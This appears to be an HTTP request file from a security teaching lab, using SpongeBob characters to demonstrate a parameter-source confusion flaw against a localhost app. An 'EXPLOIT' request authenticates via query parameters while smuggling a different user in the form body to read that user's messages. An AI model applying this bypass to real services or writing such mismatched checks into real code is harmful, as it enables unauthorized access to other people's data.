@base = http://localhost:8000/confusion/cross-component-parse

### Expected Usage: SpongeBob retrieves his own messages
GET {{base}}/example2?user=spongebob&password=bikinibottom
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "Hey SpongeBob, wanna go jellyfishing?"
#     }
#   ]
# }

###

### EXPLOIT: Authenticate as SpongeBob but retrieve Mr. Krabs's messages
### Decorator checks query params (user=spongebob), handler reads form data (user=mr.krabs)
GET {{base}}/example2?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=mr.krabs
#
# {
#   "owner": "mr.krabs",
#   "messages": [
#     {
#       "from": "pearl",
#       "message": "Daddy, I need $500 for the school dance! It's an EMERGENCY!"
#     },
#     {
#       "from": "mr.krabs",
#       "message": "Note to self: moved the secret formula to the auxiliary vault. Combination is me phone number backwards: 5665-321."
#     }
#   ]
# }
#
# IMPACT: Plankton discovers the auxiliary vault location and combination,
# gaining direct access to the Krabby Patty secret formula! Cross-component
# parameter sourcing allows authenticating as one user while accessing another's data.
